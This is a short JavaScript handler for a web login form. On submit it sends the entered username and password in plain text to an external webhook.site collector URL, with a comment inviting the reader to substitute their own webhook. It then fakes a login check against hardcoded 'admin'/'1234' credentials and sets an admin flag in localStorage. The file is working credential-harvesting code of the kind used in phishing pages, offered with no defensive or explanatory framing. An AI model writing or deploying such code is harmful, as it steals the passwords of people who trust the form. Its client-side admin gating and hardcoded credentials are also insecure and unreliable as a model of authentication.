document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const error = document.getElementById("error");

  // Replace with your Webhook URL
  const webhookUrl = "https://webhook.site/8462aa53-89f0-477e-bbbc-ea6863f86e49";

  // Send login data to Webhook
  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ username, password })
  })
  .then(response => {
    if (response.ok) {
      console.log("Login attempt logged.");
    } else {
      console.error("Failed to log login attempt.");
    }
  })
  .catch(error => {
    console.error("Error:", error);
  });

  // Simulate successful login
  if (username === "admin" && password === "1234") {
    localStorage.setItem("isAdmin", "true");
    window.location.href = "admin.html";
  } else {
    error.textContent = "Invalid username or password!";
  }
});
